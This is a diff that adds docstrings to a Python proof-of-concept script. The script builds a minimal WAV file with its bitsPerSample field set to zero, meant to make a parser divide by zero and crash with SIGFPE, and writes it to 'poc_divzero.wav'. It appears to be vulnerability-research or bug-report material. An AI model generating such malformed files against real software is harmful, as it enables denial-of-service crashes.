@@ -6,6 +6,17 @@ bitsPerSample=0 → divide by zero → SIGFPE
 import struct, sys, os
 
 def build_wav(bits_per_sample):
+    """
+    Builds a minimal RIFF/WAVE byte sequence containing a `fmt ` chunk and a `data` chunk with the specified bits-per-sample value.
+    
+    The returned bytes form a valid RIFF/WAVE file where the `bitsPerSample` field in the `fmt ` chunk is set to `bits_per_sample` (16-bit little-endian at offset 34) and the RIFF size header is updated to match the total file length.
+    
+    Parameters:
+        bits_per_sample (int): Value written into the `fmt ` chunk's `bitsPerSample` field (0–65535).
+    
+    Returns:
+        bytes: The complete WAV file bytes.
+    """
     b = bytearray()
     # RIFF header: 12 bytes
     b += b'RIFF'                                    # 0-3
@@ -33,6 +44,11 @@ def build_wav(bits_per_sample):
     return bytes(b)
 
 def main():
+    """
+    Create a proof-of-concept WAV file with bitsPerSample set to 0, write it to disk, and print file details and a verification readback.
+    
+    The function writes a minimal RIFF/WAVE byte sequence produced by build_wav(bits_per_sample=0) to the path given by the first command-line argument or 'poc_divzero.wav' by default, prints the output filename and size, logs the intended divide-by-zero crash condition, and verifies the written `bitsPerSample` value by reading the 16-bit little-endian field at offset 34.
+    """
     output = sys.argv[1] if len(sys.argv) > 1 else 'poc_divzero.wav'
     wav = build_wav(bits_per_sample=0)
     with open(output, 'wb') as f:
